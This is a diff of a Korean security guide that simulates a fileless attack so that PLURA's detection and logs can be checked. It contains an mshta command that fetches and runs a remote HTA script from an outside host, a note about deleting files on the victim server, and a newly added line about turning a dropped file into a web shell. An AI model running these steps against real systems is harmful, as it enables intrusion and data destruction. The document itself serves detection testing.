@@ -5,6 +5,7 @@
    
 2. **MALSCRIPT**
    - 공격 서버의 웹루트 디렉터리 내에 위치해야 합니다. (`/var/www/html/`)
+   - 침투한 파일은 웹 요청 본문으로 전달하여 웹셸(Web Shell)로 바꿀 수 있습니다.
 
 3. **MALSCRIPT 공격문의 경로**
    - 피해 서버에서 삭제할 파일의 경로를 입력해야 합니다.
@@ -130,6 +131,8 @@ mshta http://ethanlabs.shop/MALSCRIPT.hta
 - **PowerShell, WMIC, Mshta**는 Windows 내 강력한 스크립트 실행 도구로 파일리스 공격을 수행하는 데 자주 사용됩니다.
 - 공격자는 디스크에 파일을 저장하지 않고 메모리 내에서 바로 실행하여 탐지 회피를 시도합니다.
 - 위 과정을 통해 PLURA의 탐지 기능과 보안 로그를 확인하세요.
+
+---
 
 # 공격 개요 (Mermaid Diagram)
 
